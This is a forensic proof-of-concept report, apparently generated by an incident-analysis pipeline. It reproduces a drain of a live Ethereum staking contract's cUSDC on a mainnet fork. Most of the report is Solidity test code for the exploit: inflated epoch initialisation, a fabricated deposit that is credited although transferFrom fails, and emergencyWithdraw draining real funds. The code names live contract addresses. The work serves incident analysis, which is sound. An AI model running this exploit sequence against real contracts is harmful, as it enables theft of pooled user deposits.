## Overview & Context

This proof-of-concept (PoC) demonstrates the real mainnet exploit opportunity described in the root cause report for the Ethereum staking contract at `0x245a551ee0F55005e510B239c917fA34b41B3461` and cUSDC (`0x39AA39c021dfbaE8faC545936693aC917d5E7563`). The vulnerability arises because `Staking.deposit` credits internal balances and epoch pool sizes even when `cUSDC.transferFrom` returns `false`, and `emergencyWithdraw` later pays out those inflated internal balances from Staking’s real cUSDC holdings.

The PoC is implemented as a Foundry test that executes against a fork of Ethereum mainnet at the pre-incident block, recreating the same accounting mismatch and drain pattern with a fresh attacker identity. To run the PoC:

```bash
cd forge_poc
RPC_URL="https://<QUICKNODE_ENDPOINT_NAME>.quiknode.pro/<QUICKNODE_TOKEN>" forge test --via-ir -vvvvv
```

In this environment, `RPC_URL` is populated from `.env` and points to an Ethereum mainnet QuickNode endpoint; the test itself uses `vm.createSelectFork` to select this fork at the pre-incident block height.

## PoC Architecture & Key Contracts

- `ExploitTest` (`forge_poc/test/Exploit.sol`): the main Foundry test contract that orchestrates the exploit on a mainnet fork.
- `IStaking`: a minimal interface for the live staking contract at `0x245a551ee0F55005e510B239c917fA34b41B3461`, exposing `deposit`, `emergencyWithdraw`, `manualEpochInit`, `getCurrentEpoch`, `balanceOf`, `epochIsInitialized`, and `getEpochPoolSize`.
- `ICErc20`: a minimal interface for the live cUSDC token at `0x39AA39c021dfbaE8faC545936693aC917d5E7563`, exposing `balanceOf`, `transfer`, `transferFrom`, `approve`, and `allowance`.
- `attacker`: a fresh logical adversary EOA created via `makeAddr("attacker")`, used with Foundry’s `vm.prank`/`vm.startPrank` to exercise the exploit without reusing the real incident EOA.

Key setup and roles in the test:

```solidity
contract ExploitTest is Test {
    address constant STAKING_ADDR = 0x245a551ee0F55005e510B239c917fA34b41B3461;
    address constant CUSDC_ADDR   = 0x39AA39c021dfbaE8faC545936693aC917d5E7563;
    uint256 constant FORK_BLOCK   = 22957532;

    IStaking internal staking = IStaking(STAKING_ADDR);
    ICErc20 internal cusdc    = ICErc20(CUSDC_ADDR);

    address internal attacker;
    uint256 internal stakingBalanceBefore;
    uint256 internal attackerBalanceBefore;

    function setUp() public {
        string memory rpcUrl = vm.envString("RPC_URL");
        uint256 forkId = vm.createSelectFork(rpcUrl, FORK_BLOCK);
        vm.selectFork(forkId);

        attacker = makeAddr("attacker");

        vm.label(attacker, "AttackerEOA");
        vm.label(STAKING_ADDR, "Staking");
        vm.label(CUSDC_ADDR, "cUSDC");
        ...
    }
}
```

*Snippet: High-level PoC wiring and roles in `ExploitTest` (mainnet fork, protocol contracts, and fresh attacker identity).*

The helper function `_initEpochsForCUSDC` mirrors the behavior of the original helper contract’s epoch initialization loop: it calls `manualEpochInit` for cUSDC over a range of epochs, copying pool size forward while avoiding reverts on already-initialized epochs.

```solidity
function _initEpochsForCUSDC() internal {
    uint128 currentEpoch = staking.getCurrentEpoch();
    address[] memory tokens = new address[](1);
    tokens[0] = CUSDC_ADDR;

    if (!staking.epochIsInitialized(CUSDC_ADDR, 0)) {
        vm.prank(attacker);
        staking.manualEpochInit(tokens, 0);
    }

    for (uint128 epochId = 1; epochId <= currentEpoch; epochId++) {
        if (!staking.epochIsInitialized(CUSDC_ADDR, epochId) && staking.epochIsInitialized(CUSDC_ADDR, epochId - 1)) {
            vm.prank(attacker);
            staking.manualEpochInit(tokens, epochId);
        }
    }
}
```

*Snippet: Epoch initialization logic used to build up cUSDC pool size across epochs as in the incident helper constructor.*

## Adversary Execution Flow

The PoC’s main exploit path is encoded in `testExploit()`, which follows the ACT framing:

1. **Environment setup and pre-state checks**
   - Fork Ethereum mainnet at block `22957532`, immediately before the incident block.
   - Define a fresh `attacker` address and label key contracts for readability.
   - Record pre-state balances for the staking contract and attacker in cUSDC, enforcing the oracle pre-checks.

```solidity
stakingBalanceBefore = cusdc.balanceOf(STAKING_ADDR);
assertGt(stakingBalanceBefore, 0, "staking must hold cUSDC before exploit");

attackerBalanceBefore = cusdc.balanceOf(attacker);
assertEq(attackerBalanceBefore, 0, "attacker must start with zero cUSDC");
```

*Snippet: Oracle pre-checks that the staking pool holds cUSDC and the attacker starts with zero cUSDC.*

2. **Epoch configuration and fabricated deposit setup**
   - Call `_initEpochsForCUSDC()` to ensure that cUSDC epochs are initialized in a manner consistent with the incident helper contract’s constructor.
   - Derive the fabricated deposit amount from live state: `depositAmount = stakingBalanceBefore`. This targets the full pre-existing cUSDC pool at the staking contract.
   - Under `vm.startPrank(attacker)`, approve `depositAmount` cUSDC from `attacker` to Staking.

3. **Triggering unchecked `transferFrom` and internal credit**
   - Directly call `cusdc.transferFrom(attacker, Staking, depositAmount)` from the staking contract’s perspective (via `vm.prank(STAKING_ADDR)`) to demonstrate that the CErc20 cUSDC token returns `false` rather than reverting when the transfer cannot be executed.
   - Record staking’s real cUSDC balance and the attacker’s internal staking balance before the official `deposit`.
   - Use `vm.expectCall` to assert that `Staking.deposit` will attempt `cUSDC.transferFrom(attacker, Staking, depositAmount)` internally.
   - As `attacker`, call `staking.deposit(CUSDC_ADDR, depositAmount, address(0))`.
   - Verify that the real cUSDC balance of Staking does not increase, while the attacker’s internal staking balance increases by at least `depositAmount`.

```solidity
vm.prank(STAKING_ADDR);
bool success = cusdc.transferFrom(attacker, STAKING_ADDR, depositAmount);
assertEq(success, false, "cUSDC transferFrom should indicate failure (return false) for fabricated deposit");

uint256 stakingRealBeforeDeposit = cusdc.balanceOf(STAKING_ADDR);
uint256 attackerInternalBefore = staking.balanceOf(attacker, CUSDC_ADDR);

vm.expectCall(
    CUSDC_ADDR,
    abi.encodeWithSignature(
        "transferFrom(address,address,uint256)",
        attacker,
        STAKING_ADDR,
        depositAmount
    )
);

vm.prank(attacker);
staking.deposit(CUSDC_ADDR, depositAmount, address(0));

uint256 stakingRealAfterDeposit = cusdc.balanceOf(STAKING_ADDR);
uint256 attackerInternalAfter = staking.balanceOf(attacker, CUSDC_ADDR);

assertEq(
    stakingRealAfterDeposit,
    stakingRealBeforeDeposit,
    "staking cUSDC balance must not increase on failed transferFrom"
);
assertGe(
    attackerInternalAfter - attackerInternalBefore,
    depositAmount,
    "staking must credit attacker stake even when transferFrom fails"
);
```

*Snippet: Core exploit step where `deposit` credits attacker stake despite `cUSDC.transferFrom` returning false and the staking contract’s real cUSDC balance remaining unchanged.*

Before withdrawal, the PoC snapshots the epoch pool size for the current epoch:

```solidity
uint128 currentEpoch = staking.getCurrentEpoch();
uint256 epochPoolBeforeWithdraw = staking.getEpochPoolSize(CUSDC_ADDR, currentEpoch);
```

4. **Exploit execution and profit realization**
   - As `attacker`, call `staking.emergencyWithdraw(CUSDC_ADDR)`.
   - After withdrawal, recompute the attacker’s cUSDC balance and the staking contract’s cUSDC balance.
   - Assert that the attacker’s cUSDC balance increased (attacker profit) and the staking contract’s cUSDC balance decreased (victim depletion).

```solidity
vm.prank(attacker);
staking.emergencyWithdraw(CUSDC_ADDR);

uint256 attackerBalanceAfter = cusdc.balanceOf(attacker);
uint256 stakingBalanceAfter = cusdc.balanceOf(STAKING_ADDR);

assertGt(
    attackerBalanceAfter,
    attackerBalanceBefore,
    "attacker must have strictly more cUSDC after exploit"
);

assertLt(
    stakingBalanceAfter,
    stakingBalanceBefore,
    "staking contract must lose cUSDC during exploit"
);
```

*Snippet: End-of-flow checks confirming that the exploit transfers real cUSDC from the staking contract to the attacker.*

5. **Post-condition: unbacked internal epoch claim**
   - After `emergencyWithdraw`, retrieve `epochPoolAfterWithdraw` and assert that it equals the pre-withdrawal epoch pool size.
   - Compare `epochPoolAfterWithdraw` to `stakingBalanceAfter` to show that the internal epoch accounting for cUSDC exceeds the real backing balance, capturing the persistent accounting inconsistency induced by the unchecked `transferFrom`.

```solidity
uint256 epochPoolAfterWithdraw = staking.getEpochPoolSize(CUSDC_ADDR, currentEpoch);
assertEq(epochPoolAfterWithdraw, epochPoolBeforeWithdraw, "epoch pool size should remain unchanged");

assertGt(
    epochPoolAfterWithdraw,
    stakingBalanceAfter,
    "internal cUSDC epoch pool must exceed real staking cUSDC balance after withdraw"
);
```

*Snippet: Hard oracle on unbacked internal epoch pool size vs. real cUSDC balance after the drain.*

## Oracle Definitions and Checks

The PoC is guided by `/artifacts/poc/oracle_generator/oracle_definition.json`, which defines variables, pre-checks, and oracle constraints for this incident.

### Variables

- `attacker`: a logical attacker address (EOA role).
- `staking_contract`: `0x245a551ee0F55005e510B239c917fA34b41B3461` (protocol staking contract).
- `cusdc_token`: `0x39AA39c021dfbaE8faC545936693aC917d5E7563` (cUSDC CErc20 token, profit/loss asset).

These map directly into `ExploitTest` as `attacker`, `staking`, and `cusdc`.

### Pre-checks

1. **Staking holds cUSDC pre-exploit**
   - Definition: “Staking contract must begin with a strictly positive cUSDC balance representing pooled user deposits before any adversary interaction.”
   - Implementation:

   ```solidity
   stakingBalanceBefore = cusdc.balanceOf(STAKING_ADDR);
   assertGt(stakingBalanceBefore, 0, "staking must hold cUSDC before exploit");
   ```

2. **Attacker starts with zero cUSDC**
   - Definition: “The attacker must start with zero cUSDC so that any cUSDC they hold after the exploit is pure profit sourced from the staking contract.”
   - Implementation:

   ```solidity
   attackerBalanceBefore = cusdc.balanceOf(attacker);
   assertEq(attackerBalanceBefore, 0, "attacker must start with zero cUSDC");
   ```

### Hard constraints

1. **`hard_asset_type_cusdc` – Asset type**
   - Definition: Profit and victim depletion must be realized in the same cUSDC token as the original incident.
   - Implementation:

   ```solidity
   assertEq(address(cusdc), CUSDC_ADDR, "profit/loss asset must be mainnet cUSDC");
   ```

2. **`hard_unchecked_transferfrom_credit` – Unchecked `transferFrom` credit**
   - Definition: A deposit-like call must succeed and credit internal stake even when underlying `cUSDC.transferFrom` fails and returns `false`.
   - Implementation:

   ```solidity
   vm.prank(STAKING_ADDR);
   bool success = cusdc.transferFrom(attacker, STAKING_ADDR, depositAmount);
   assertEq(success, false, "cUSDC transferFrom should indicate failure (return false) for fabricated deposit");

   ...

   vm.expectCall(
       CUSDC_ADDR,
       abi.encodeWithSignature(
           "transferFrom(address,address,uint256)",
           attacker,
           STAKING_ADDR,
           depositAmount
       )
   );

   vm.prank(attacker);
   staking.deposit(CUSDC_ADDR, depositAmount, address(0));

   ...

   assertGe(
       attackerInternalAfter - attackerInternalBefore,
       depositAmount,
       "staking must credit attacker stake even when transferFrom fails"
   );
   ```

3. **`hard_unbacked_claim_internal_gt_real` – Unbacked internal claim**
   - Definition: Internal cUSDC accounting (e.g., epoch pool size) must exceed the real backing balance after the exploit, reflecting an unbacked claim.
   - Implementation:

   ```solidity
   uint256 epochPoolAfterWithdraw = staking.getEpochPoolSize(CUSDC_ADDR, currentEpoch);
   assertEq(epochPoolAfterWithdraw, epochPoolBeforeWithdraw, "epoch pool size should remain unchanged");

   assertGt(
       epochPoolAfterWithdraw,
       stakingBalanceAfter,
       "internal cUSDC epoch pool must exceed real staking cUSDC balance after withdraw"
   );
   ```

### Soft constraints

1. **`soft_attacker_profit_cusdc` – Attacker profit in cUSDC**
   - Definition: Attacker ends strictly richer in cUSDC than at the start.
   - Implementation:

   ```solidity
   assertGt(
       attackerBalanceAfter,
       attackerBalanceBefore,
       "attacker must have strictly more cUSDC after exploit"
   );
   ```

2. **`soft_victim_depletion_cusdc` – Staking cUSDC depletion**
   - Definition: Staking contract’s cUSDC balance strictly decreases during the exploit.
   - Implementation:

   ```solidity
   assertLt(
       stakingBalanceAfter,
       stakingBalanceBefore,
       "staking contract must lose cUSDC during exploit"
   );
   ```

Together, these checks closely follow the oracle definitions and treat them as the formal specification of exploit success.

## Validation Result and Robustness

The validator re-ran the PoC with:

```bash
cd forge_poc
RPC_URL="https://<QUICKNODE_ENDPOINT_NAME>.quiknode.pro/<QUICKNODE_TOKEN>" forge test --via-ir -vvvvv
```

All tests in `Exploit.sol` passed on the mainnet fork, and the resulting detailed trace shows:

- `cUSDC.transferFrom` returning `false` during the fabricated deposit, with a `Failure` event, while `Staking.deposit` still credits internal stake and epoch pool size.
- `Staking.emergencyWithdraw` transferring real cUSDC from the staking contract to the attacker.
- Final state where the attacker’s cUSDC balance is higher than at the start, and the staking contract’s cUSDC balance has decreased.

The machine-readable validation artifact is:

```json
{
  "overall_status": "Pass",
  "artifacts": {
    "validator_test_log_path": "/home/wesley/TxRayExperiment/incident-202601011533/artifacts/poc/poc_validator/forge-test.log"
  }
}
```

*Snippet: Summary view of the validator’s `overall_status` and main artifact path (full JSON in `artifacts/poc/poc_validator/poc_validated_result.json`).*

The PoC also satisfies the quality criteria:

- **Oracle alignment**: All defined variables, pre-checks, hard constraints, and soft constraints are implemented with closely matching assertions.
- **Human-readable and labeled**: The test labels key addresses and includes explanatory comments for each oracle and exploit phase.
- **No magic numbers**: The fork block and deposit amount are both justified from the root cause and on-chain state; address constants are the core protocol addresses from the incident.
- **Mainnet fork**: The exploit runs directly on a fork of Ethereum mainnet, with no mocks of staking or cUSDC.
- **Self-contained**: The attacker identity is a fresh address; the test does not reuse the real incident attacker or the historical helper contract bytecode.

## Linking PoC Behavior to Root Cause

The root cause report describes a helper contract that:

1. Forks or operates on mainnet pre-incident state where Staking holds cUSDC and the adversary has none.
2. Uses `manualEpochInit` to clone the cUSDC pool size across epochs.
3. Calls `Staking.deposit` for cUSDC with a large `amount`, where `cUSDC.transferFrom` returns `false`, yet internal balances and `poolSize` are credited.
4. Immediately calls `Staking.emergencyWithdraw` to withdraw those inflated internal balances, draining Staking’s real cUSDC to the adversary EOA.

The PoC directly mirrors this flow:

- **Epoch initialization**: `_initEpochsForCUSDC` repeatedly calls `manualEpochInit` from a fresh attacker address, building epoch pool size in the same pattern as the original helper contract.
- **Unchecked `transferFrom`**: The PoC explicitly demonstrates `cUSDC.transferFrom` returning `false` when invoked from the staking contract and then confirms that `Staking.deposit` still increases the attacker’s internal balance and epoch pool size.
- **Emergency withdrawal drain**: Calling `emergencyWithdraw` from the attacker yields an increase in the attacker’s cUSDC balance and a corresponding decrease in Staking’s cUSDC balance on the fork, matching the balance-diff evidence from the incident.
- **Accounting mismatch**: After the withdrawal, the test confirms that the epoch pool size (internal accounting) remains inflated while the contract’s real cUSDC balance has dropped, reproducing the core accounting inconsistency highlighted in the root cause.

Viewed through the ACT lens:

- **A (Adversary-crafted)**: The PoC’s attacker address and calls to `manualEpochInit` and `deposit` are adversary-controlled and permissionless.
- **C (Chain-level)**: All actions are executed on a fork of Ethereum mainnet using the live staking and cUSDC contracts and their real state at the pre-incident block.
- **T (Targeted)**: The sequence is carefully targeted at the unchecked `transferFrom` logic and the emergency withdrawal path that pays out inflated internal balances; success is confirmed via the oracle checks on attacker profit, victim depletion, and unbacked internal epoch pool size.

Taken together, the PoC provides a faithful, end-to-end reproduction of the vulnerability and exploit mechanics described in the root cause analysis, and it passes all defined oracles and quality checks under the validator.+

